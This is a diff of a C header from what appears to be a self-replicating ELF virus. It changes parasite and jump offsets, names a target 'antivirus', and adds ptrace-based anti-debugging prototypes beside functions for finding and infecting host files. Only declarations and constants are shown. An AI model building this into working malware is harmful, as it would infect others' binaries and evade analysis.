@@ -22,6 +22,8 @@
 #include <sys/random.h>
 #include <limits.h>
 #include <errno.h>
+#include <sys/mman.h>
+#include <sys/ptrace.h>
 
 #include "./logger.h"
 
@@ -37,26 +39,26 @@
 #define PAGE_SIZE 0x1000
 #define FCNT_SIZE 0x7
 #define CODE_SIZE 0x5
-#define OFFSET_SIZE 0x9
+#define OFFSET_SIZE 0xa
 
-#define STUB_OFFSET 0x1e
-#define STUB_SIZE_OFFSET 0x23
-#define PARASITE_OFFSET 0x2a
-#define PARASITE_SIZE_OFFSET 0x2f
+#define PARASITE_OFFSET 42
+#define PARASITE_SIZE_OFFSET 47
+#define JUMP_OFFSET 85
 
 #define TARGET "antivirus"
 
 #define SIGNATURE_SIZE 0x8
 
 #define OFFSET_1 0x19
-#define OFFSET_2 0x41
-#define OFFSET_3 0x6d
-#define OFFSET_4 0x8b
-#define OFFSET_5 0xac
-#define OFFSET_6 0xd0
-#define OFFSET_7 0x100
-#define OFFSET_8 0x136
-#define OFFSET_9 0x152
+#define OFFSET_2 0x38
+#define OFFSET_3 0x52
+#define OFFSET_4 0x5d
+#define OFFSET_5 0x89
+#define OFFSET_6 0xa7
+#define OFFSET_7 0xc8
+#define OFFSET_8 0xec
+#define OFFSET_9 0x11c
+#define OFFSET_A 0x152
 
 #define RBP 0x5d55
 #define RSP 0x5c54
@@ -163,6 +165,7 @@ void __entry(void);
 
 // WAR
 void antivirus(struct s_host *host, struct s_keychain *keychain, enum e_context context);
+void antidebug(struct s_host *host, struct s_keychain *keychain, enum e_context context);
 void war(struct s_host *host, struct s_keychain *keychain, enum e_context context);
 void find_host(struct s_host *host, struct s_keychain *keychain, void *dir, const size_t size, enum e_context context);
 void host_constructor(struct s_host *host, struct s_keychain *keychain, char *filename, enum e_context context);
@@ -190,8 +193,10 @@ int _stat(const char *filename, struct stat *statbuf);
 void *_mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);
 ssize_t _write(int fd, const void *buf, size_t count);
 int _munmap(void *addr, size_t length);
-void _fatal(void);
+void _fatal(int exit);
 int _execve(const char *filename, char *const argv[], char *const envp[]);
+long _ptrace(long request, long pid ,unsigned long addr, unsigned long data);
+pid_t _getppid(void);
 pid_t _fork(void);
 pid_t _wait4(pid_t pid, int *wstatus, int options, struct rusage *rusage);
 size_t _strlen(const char *str);
